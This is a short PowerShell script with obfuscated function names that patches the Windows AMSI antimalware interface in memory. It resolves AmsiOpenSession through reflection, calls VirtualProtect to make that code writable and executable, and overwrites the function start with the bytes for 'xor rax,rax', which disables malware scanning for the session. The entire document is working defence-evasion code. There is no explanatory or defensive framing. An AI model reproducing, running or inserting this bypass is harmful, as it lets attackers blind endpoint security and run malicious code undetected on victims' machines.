function tratryrato{
Param($moduleName, $functionName)

$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
$tmp=@()
$assem.GetMethods() | ForEach-Object{If($_.Name -eq 'GetProcAddress') {$tmp+=$_}}
return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function rarotreae{
Param(
[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
[Parameter(Position = 1)] [Type] $delType = [Void]
)

$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType',
'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')

return $type.CreateType()
}

[IntPtr]$rara = tratryrato amsi.dll AmsiOpenSession
$oldProtect = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tratryrato kernel32.dll VirtualProtect),
(rarotreae @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))

$vp.Invoke($rara, 3, 0x40, [ref]$oldProtect)
$atratard = "We invoked successfully"
$ratata = [Byte[]] (0x48, 0x31, 0xC0)
# pause here
[System.Runtime.InteropServices.Marshal]::Copy($ratata, 0, $rara, 3)

$vp.Invoke($rara, 3, 0x20, [ref]$oldProtect)